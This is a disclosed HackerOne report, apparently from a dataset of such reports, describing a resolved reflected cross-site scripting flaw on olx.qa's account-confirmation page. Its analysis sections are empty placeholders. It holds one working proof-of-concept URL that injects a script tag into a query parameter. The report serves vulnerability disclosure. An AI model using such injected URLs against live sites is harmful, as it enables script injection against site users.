---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '150837'
original_report_id: '150837'
title: Reflected Cross Site scripting Attack (XSS)
weakness: Cross-site Scripting (XSS) - Generic
team_handle: olx
created_at: '2016-07-12T06:23:18.495Z'
disclosed_at: '2016-10-20T11:49:47.746Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 0
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected Cross Site scripting Attack (XSS)

## Metadata

- HackerOne Report ID: 150837
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: olx
- Disclosed At: 2016-10-20T11:49:47.746Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,

Vulnerable URL :-
https://olx.qa/en/account/confirm/?email=&hash=26d7e919ff37300d2f363c9066dd5b9d&ts=14682640390036a<script>alert(1)<%2fscript>261db&p=0674cd7dFl22cq3mM5jZfwjNxZ7slA==&vk=0&utm_source=test&utm_medium=email&utm_campaign=link

XSS will be trigger.

Well as you guys mentioned in the report #150735 that .qa might not be in scope Nevertheless reporting here to making the platform secure.  And in a hope to get HOF ;) 

Regards,
Nilesh S

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
